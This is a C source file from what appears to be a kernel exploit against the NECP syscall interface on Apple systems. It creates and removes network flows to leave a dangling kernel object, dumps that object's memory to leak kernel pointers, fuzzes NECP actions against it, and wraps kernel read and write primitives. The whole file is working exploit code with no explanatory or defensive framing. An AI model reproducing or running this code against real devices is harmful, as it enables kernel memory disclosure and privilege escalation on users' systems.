#include "exploit.h"
#include "necp.h"

int      g_fd   = -1;
uint8_t  g_uuid[16];

static long necp_syscall(int fd,uint32_t a,void*u,size_t ul,void*d,size_t dl){
    return syscall(SYS_NECP_ACTION,fd,a,u,(uint32_t)ul,d,(uint32_t)dl);
}
static int necp_open_fd(void){ return (int)syscall(SYS_NECP_OPEN,0); }
static int necp_add_client(int fd,uint8_t o[16]){
    uint8_t p[1]={0}; return (int)syscall(SYS_NECP_ACTION,fd,NECP_ADD_CLIENT,o,16,p,1);
}
static int necp_remove_flow(int fd,const uint8_t f[16]){
    return (int)necp_syscall(fd,NECP_REMOVE_FLOW,(void*)f,16,NULL,0);
}
int nk_necp_open(void){
    g_fd=necp_open_fd();
    if(g_fd<0){ nk_log("[-] necp_open errno=%d",errno); return -1; }
    if(necp_add_client(g_fd,g_uuid)!=0){ nk_log("[-] add_client errno=%d",errno); close(g_fd); g_fd=-1; return -1; }
    nk_log("[+] fd=%d client=%02x%02x%02x%02x",g_fd,g_uuid[0],g_uuid[1],g_uuid[2],g_uuid[3]);
    return 0;
}
static int make_gated_flow(uint8_t out[16],uint16_t flags,uint16_t nexus){
    necp_flow_req_t req; memset(&req,0,sizeof(req));
    memcpy(req.in_uuid,g_uuid,16); req.flags=flags; req.nexus_count=nexus;
    if(necp_syscall(g_fd,NECP_ADD_FLOW,(void*)g_uuid,16,&req,sizeof(req))!=0) return -1;
    uint8_t u[16]; memcpy(u,req.out_uuid,16);
    int az=1; for(int j=0;j<16;j++) if(u[j]){az=0;break;}
    if(az) memcpy(u,req.in_uuid,16);
    if(!(u[GATE_BYTE]&0x01)){ necp_remove_flow(g_fd,u); return -1; }
    memcpy(out,u,16); return 0;
}
static long copy_once(uint8_t*r,size_t n){ return necp_syscall(g_fd,NECP_COPY_RESULT,(void*)g_uuid,16,r,n); }
int nk_necp_recon(void){
    nk_log("[recon] dangling object dump");
    uint8_t flow[16];
    if(make_gated_flow(flow,0x0040,0)!=0){ nk_log("[-] recon: no gated flow"); return -1; }
    uint8_t uu[16]; memcpy(uu,flow,16); uu[GATE_BYTE]|=0x01; necp_remove_flow(g_fd,uu);
    static uint8_t res[COPY_RESULT_SZ]; memset(res,0,sizeof(res));
    long r=copy_once(res,sizeof(res)); nk_log("[recon] dangling copy r=%ld",r);
    if(r<=0) return -1;
    g_nk.has_rw=1; size_t n=(size_t)r;
    for(size_t off=0;off<n;off+=16){ char ln[128]; int ps=snprintf(ln,sizeof(ln),"[dump+%03zu]",off);
        for(size_t i=0;i<16&&off+i<n;i++) ps+=snprintf(ln+ps,sizeof(ln)-ps," %02x",res[off+i]); nk_log("%s",ln); }
    int leaks=0;
    for(size_t off=0;off+8<=n;off+=8){ uint64_t v; memcpy(&v,res+off,8); uint32_t hi=(uint32_t)(v>>32);
        if(hi==0xfffffff0||hi==0xfffffe00||hi==0xfffffeff){ nk_log("[leak] off=0x%zx ptr=0x%016llx",off,(unsigned long long)v); leaks++; } }
    nk_log("[recon] kernel-range pointers: %d",leaks); return 0;
}
int nk_action_fuzz(void){
    nk_log("[afuzz] baseline dead uuid");
    static uint8_t buf[512]; static long br[64]; static int be[64];
    uint8_t dead[16]; memset(dead,0xAA,16);
    for(int a=0;a<64;a++){ errno=0; memset(buf,0,sizeof(buf)); br[a]=necp_syscall(g_fd,(uint32_t)a,(void*)dead,16,buf,sizeof(buf)); be[a]=errno; }
    uint8_t flow[16];
    if(make_gated_flow(flow,0x0040,0)!=0){ nk_log("[-] afuzz: no gated flow"); return -1; }
    uint8_t uu[16]; memcpy(uu,flow,16); uu[GATE_BYTE]|=0x01; necp_remove_flow(g_fd,uu);
    nk_log("[afuzz] dangling armed, sweep 64");
    int anom=0;
    for(int a=0;a<64;a++){ errno=0; memset(buf,0,sizeof(buf));
        long r=necp_syscall(g_fd,(uint32_t)a,(void*)uu,16,buf,sizeof(buf)); int e=errno;
        if(r!=br[a]||e!=be[a]){ nk_log("[afuzz ANOM] a=0x%02x r=%ld e=%d (dead r=%ld e=%d)",a,r,e,br[a],be[a]); anom++;
            if(r>0) for(size_t off=0;off+8<=(size_t)r&&off<128;off+=8){ uint64_t v; memcpy(&v,buf+off,8); uint32_t hi=(uint32_t)(v>>32);
                if(hi==0xfffffff0||hi==0xfffffe00) nk_log("[afuzz LEAK] a=0x%02x off=%zu ptr=0x%016llx",a,off,(unsigned long long)v); } } }
    nk_log("[afuzz] done anomalies=%d",anom); return 0;
}
extern int nk_do_kread(uint64_t,void*,size_t) __attribute__((weak_import));
extern int nk_do_kwrite64(uint64_t,uint64_t) __attribute__((weak_import));
int nk_kread(uint64_t a,void*o,size_t l){ if(nk_do_kread) return nk_do_kread(a,o,l); nk_log("[-] kread: no primitive"); return -1; }
uint64_t nk_kread64(uint64_t a){ uint64_t v=0; return (nk_kread(a,&v,8)==0)?v:0; }
uint32_t nk_kread32(uint64_t a){ uint32_t v=0; return (nk_kread(a,&v,4)==0)?v:0; }
int nk_kwrite64(uint64_t a,uint64_t v){ if(nk_do_kwrite64) return nk_do_kwrite64(a,v); nk_log("[-] kwrite: no primitive"); return -1; }
